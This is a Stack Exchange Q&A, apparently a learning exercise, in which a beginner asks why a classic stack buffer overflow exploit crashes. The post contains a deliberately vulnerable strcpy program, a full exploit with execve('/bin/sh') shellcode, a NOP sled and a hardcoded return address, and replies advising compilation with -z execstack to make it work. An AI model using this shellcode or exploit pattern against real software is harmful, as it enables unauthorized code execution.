{
    "title": "Beginner buffer overflow - why isn't my shellcode executing?",
    "link": "https://reverseengineering.stackexchange.com/questions/9125/beginner-buffer-overflow-why-isnt-my-shellcode-executing",
    "content": "I'm following the video here: https://www.youtube.com/watch?v=N0DBu3TGejI\nExploitMe.c\n<pre><code>#include<stdio.h>\n#include<string.h>\n\nmain(int argc, char **argv)\n{\n        char buffer[80];\n\n        strcpy(buffer, argv[1]);\n\n        return 1;\n}\n</code></pre>\nHackYou.c\n<pre><code>#include<stdio.h>\n#include<stdlib.h>\n#include<string.h>\n\n// shellcode ripped from http://www.milw0rm.com/shellcode/444\n\nchar shellcode[]=\n\"\\x31\\xc0\"                      // xorl         %eax,%eax\n\"\\x50\"                          // pushl        %eax\n\"\\x68\\x6e\\x2f\\x73\\x68\"          // pushl        $0x68732f6e\n\"\\x68\\x2f\\x2f\\x62\\x69\"          // pushl        $0x69622f2f\n\"\\x89\\xe3\"                      // movl         %esp,%ebx\n\"\\x99\"                          // cltd\n\"\\x52\"                          // pushl        %edx\n\"\\x53\"                          // pushl        %ebx\n\"\\x89\\xe1\"                      // movl         %esp,%ecx\n\"\\xb0\\x0b\"                      // movb         $0xb,%al\n\"\\xcd\\x80\"                      // int          $0x80\n;\n\nchar retaddr[] = \"\\x08\\xf3\\xff\\xbf\";\n\n#define NOP 0x90\n\n\nmain()\n{\n        char buffer[96];\n\n        memset(buffer, NOP, 96);\n\n        memcpy(buffer, \"EGG=\", 4);\n\n        memcpy(buffer+4, shellcode, 24);\n\n        memcpy(buffer+88, retaddr, 4);\n        memcpy(buffer+92, \"\\x00\\x00\\x00\\x00\", 4);\n\n        putenv(buffer);\n\n        system(\"/bin/sh\");\n\n        return 0;\n\n}\n</code></pre>\nI run ./HackYou, in that environment there is an enviroment variable named $EGG that is used as an argument to the ExploitMe.c. $EGG contains: 24 bytes shell code, 60 bytes nop, and 4 bytes to override the RET address for a total of 88 bytes (Buffer + EBP + RET)\nThis screenshot contains the information you need to know:\n\nOn ExploitMe.c, I break on line 8. The first thing I print is the stack. 0x00881d36 is the RET address.  \nThen I print argv1, as you can see it is 22 words. It will overwrite the Buffer+EBP+RET exactly. The start of the buffer variable is at 0xbffff308 (ESP+8), so I add that into the end of the payload. \nThen I step. The RET has been perfectly overwritten with the buffer memory address.\nIt should return to the beginning of the buffer and start executing my shell code. All seems fine to me, but instead of giving me a shell, it gives me a segmentation fault. \nWhat's going on? \nThank you.\n",
    "votes": "0",
    "answers": 1,
    "views": "2k",
    "tags": [
        "buffer-overflow",
        "shellcode"
    ],
    "user": "Mark Hoglund",
    "time": "Jun 12, 2015 at 21:12",
    "comments": [
        {
            "user": "Jason Geffner",
            "text": "When the debuggee is suspended at <pre><code>return 1;</code></pre>, what's the disassembly for the code at <pre><code>$eip</code></pre>?\n",
            "time": null
        },
        {
            "user": "Stolas",
            "text": "100% w/o reading the post. Check memory region for executable flags, dep kills most old tutorials.\n",
            "time": null
        },
        {
            "user": "Mark Hoglund",
            "text": "i.imgur.com/hPpxT3E.png\n",
            "time": null
        },
        {
            "user": "Mark Hoglund",
            "text": "@Stolas, I've compiled with -fno-stack-protector\n",
            "time": null
        },
        {
            "user": "perror",
            "text": "Did you compiled it with executable stack ? Check it with checksec.sh script. And, try to compile it with the option <pre><code>-z execstack</code></pre>.\n",
            "time": null
        }
    ],
    "answers_data": [
        {
            "content": "When compiling I did not disable the stack smashing protection. Compiling with -z execstack fixed this.\n",
            "votes": "0",
            "user": "Mark Hoglund",
            "time": "Jun 20, 2015 at 0:09",
            "is_accepted": true,
            "comments": []
        }
    ]
}